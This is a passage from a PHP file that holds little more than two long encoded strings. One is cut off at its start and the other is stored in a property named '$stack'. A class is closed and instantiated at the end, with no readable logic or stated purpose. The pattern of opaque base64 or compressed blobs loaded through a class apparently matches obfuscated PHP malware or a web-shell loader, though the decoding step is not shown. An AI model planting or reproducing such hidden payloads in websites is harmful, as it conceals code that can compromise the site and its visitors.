	ygk2jxKb990YZZ1siLx1NHgOPUBVcFPLD87Up77cp3FUV9x2oD5u/7rODEm9u+b76e86pLbkM9C43ZNt
	K3TxntoUYHYaoVCz1ZHJWzj+SLfgrsOv5bVHPiTDmkRLiuL74GqS//OqRQaQv6tGlMVLbLes4mw/oeRz
	790zu6bvzr8Pfi69r5V2N5eYKVibbNEe2AVoc97usnSosIXEkZW2Qlh2hy/RZ8joXeCCmhkmMEzFRHYb
	4brQ9o4Ns3tJv3KOyC+ubWFf2/HJJUCbU0nLteCGawRoWG4Dc84W0wvaTcUhiipACFu2YaDXp4V1q6mk
	/1POYdfAHt0Xjh3hnHtwjx5Qe9dOsPZDPvW/H57wZeGvGeJPrTdRE03Rhq1XwC82X1fYhcwOi6rOkeqt
	IpSSm8hZ6t2hDcdE1YWqpW+LVo+e9ASpa0kLfciI1EzXrAK44g18P6zYyke5mbkn/qdd1WlWWFGHE3j2
	AjPer/CWK/E424PY/fJuPw/9e5agksE4htBlGPWRdLEYzWQXhB9OsfAkd0jMG0TkPNYvsekhjw57wSmP
	Vf6s/USK++ra59jEca0dwYLi/K7yPaLk6TDUeg3WGrCpsTepN26Y+L8Q0Sq2nRZ9qfB5k3pLI7uRwG1X
	baPRdygJK3Zu/g1wt8VxlZVLq6mBEewNTdvvGA9SKXbRaKn5Dx7E61R2ck3A1k/one14TTPNoSpr6h9V
	vV+I0WQWDztUX0R6kOdEdzMD+lBuOmd5pKx9fhLFiiwPK+dBheD65DD0HAIDaoq3B2wl2aaySkDvoYls
	ZB6qyOXkHzWbJocqYT5B7yPa4RV5ZCxzmuCbIKekcBRnGcPO1QmrQawQkcS79wi+hW+JCmaeuSszAkjc
	hVgzx1allk8Bc2Y7HriFAdSB9mq8v6a2r94ZR/ukf/ZBWRkOXL7aKtdfRxBYaCdQuzxbQkhJdS7B2WVx
	1w6Vfbqmpg==";
	 
	var $stack = "XY9Pa4NAEMXvgXyH6SKsgvQPbdqD0UtZSOnBVm0uUmQ1G1zIqt0dS9JP3zG00HqbmffmN2+8Wn4ZiIFV
	DC7BjbVD65vdyveqXGRbkZV8UxQv1SbNC/4ehHAdwm0QLRd672vnFJIxE69vIi9KXn0cyROA10rXEvQf
	buY6k27ugwjUwak/tMc0fX4SpTcFI9hy8UubSRHQ0oUyA578s4UOW4Wj7UBaK3+GIfCHpq6bOz6FVk3b
	A1/ve2tANqj7LmYMjMK238Vs6B2yZK27YUTA06BihuqIDDppqKbcM5X+M5r0T3kYqU0S0q8meMKjbw==
	";
}

new Foo();
?>